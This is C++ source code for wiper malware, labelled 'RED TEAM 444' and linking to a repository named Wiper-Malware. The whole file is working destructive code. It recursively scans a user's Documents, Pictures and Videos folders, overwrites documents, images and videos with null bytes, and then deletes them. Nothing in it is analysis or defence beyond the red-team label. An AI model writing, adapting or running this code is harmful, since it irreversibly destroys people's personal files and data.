/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>

// Function to overwrite a file with null bytes
void overwriteFile(const std::string& filepath) {
    try {
        std::ofstream file(filepath, std::ios::binary | std::ios::in);
        if (file.is_open()) {
            auto fileSize = std::filesystem::file_size(filepath);
            for (uint64_t i = 0; i < fileSize; i++) {
                file.put(0);  // Overwriting with null bytes
            }
            file.close();
        }
        std::filesystem::remove(filepath);  // Delete the file after overwriting
        std::cout << "File " << filepath << " overwritten and deleted successfully.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error while overwriting file: " << e.what() << "\n";
    }
}

// Function to scan directories recursively and target specific file types
void findAndWipeFiles(const std::string& directory, const std::vector<std::string>& fileExtensions) {
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
            if (entry.is_regular_file()) {
                std::string filepath = entry.path().string();
                std::string extension = entry.path().extension().string();
                
                // Check if the file's extension matches the target file types
                if (std::find(fileExtensions.begin(), fileExtensions.end(), extension) != fileExtensions.end()) {
                    overwriteFile(filepath);
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Error in directory scan: " << e.what() << "\n";
    }
}

void runWiper() {
    // Specify the target file extensions (e.g., documents, images, videos)
    std::vector<std::string> targetExtensions = { ".txt", ".docx", ".pdf", ".jpg", ".png", ".mp4" };

    // Specify the directories to scan (could be the entire user directory or specific paths)
    std::vector<std::string> targetDirectories = {
        "C:\\Users\\User\\Documents",
        "C:\\Users\\User\\Pictures",
        "C:\\Users\\User\\Videos"
        // Add more directories as needed
    };

    // Scan each directory for target file types and wipe them
    for (const auto& directory : targetDirectories) {
        findAndWipeFiles(directory, targetExtensions);
    }
}
